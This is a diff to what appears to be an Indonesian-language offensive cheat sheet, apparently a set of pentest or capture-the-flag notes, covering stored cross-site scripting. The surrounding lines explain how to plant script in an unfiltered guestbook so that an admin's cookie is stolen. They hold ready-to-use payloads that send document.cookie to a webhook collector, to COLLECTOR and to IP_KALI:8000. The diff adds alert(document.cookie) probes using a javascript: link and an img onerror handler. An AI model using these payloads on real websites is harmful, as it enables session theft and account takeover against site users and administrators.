@@ -611,6 +611,9 @@ ${7*7}           # Freemarker/JSP
 **Untuk apa:** menyimpan script jahat di halaman (mis. buku tamu tanpa filter); saat admin membukanya, curi cookie/session ke server kita (webhook).
 
 ```html
+<!-- script alert cookie -->
+<a href=javascript:alert(document.cookie);>Saya daftar!</a>
+
 <!-- Curi cookie admin ke webhook collector -->
 <script>
 fetch('http://<TARGET>:8085/api/collect.php?token=k3y_w3bh00k_9f21&data='+document.cookie)
@@ -618,6 +621,7 @@ fetch('http://<TARGET>:8085/api/collect.php?token=k3y_w3bh00k_9f21&data='+docume
 
 <!-- Alternatif image beacon -->
 <img src=x onerror="this.src='http://COLLECTOR/?c='+document.cookie">
+<img src='x' onerror=alert(document.cookie)>
 
 <!-- Exfil ke listener sendiri -->
 <script>new Image().src='http://IP_KALI:8000/?c='+btoa(document.cookie)</script>
